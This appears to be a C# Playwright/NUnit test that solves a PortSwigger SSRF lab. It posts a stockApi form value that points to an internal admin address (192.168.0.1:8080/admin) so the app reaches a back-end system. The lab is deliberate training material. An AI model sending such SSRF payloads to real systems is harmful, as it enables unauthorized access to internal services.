using Microsoft.Playwright;
using Microsoft.Playwright.NUnit;

namespace TestProject1._2._SSRF;

/// <summary>
/// Lab: Basic SSRF against another back-end system
/// Url: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
/// </summary>
internal class SSRFPlaywrightTest : PlaywrightTest
{
    private const string YourUniqueLabId = "0a6900b404e2dcb6c0a35ee4009100c6";

    private IAPIRequestContext Request = null;

    [SetUp]
    public async Task Setup()
    {
        await SetupPlaywrightContext();
    }

    private async Task SetupPlaywrightContext()
    {
        var target = $"https://{YourUniqueLabId}.web-security-academy.net/";

        var headers = new Dictionary<string, string>();

        Request = await Playwright.APIRequest.NewContextAsync(new APIRequestNewContextOptions
        {
            BaseURL = target,
            ExtraHTTPHeaders = headers,
        });
    }

    [Test]
    [Ignore("Current API implementation on the portswigger returns gzip header when content is plain. Please use native HTTP Client")]
    public async Task ValidateSSRFPlaywright()
    {
        var data = Request.CreateFormData();
        data.Set("stockApi", "http://192.168.0.1:8080/admin");

        var response = await Request.PostAsync("/product/stock", new APIRequestContextOptions
        {
            Form = data,
        });

        Assert.That(response.Ok, Is.True);
    }
}

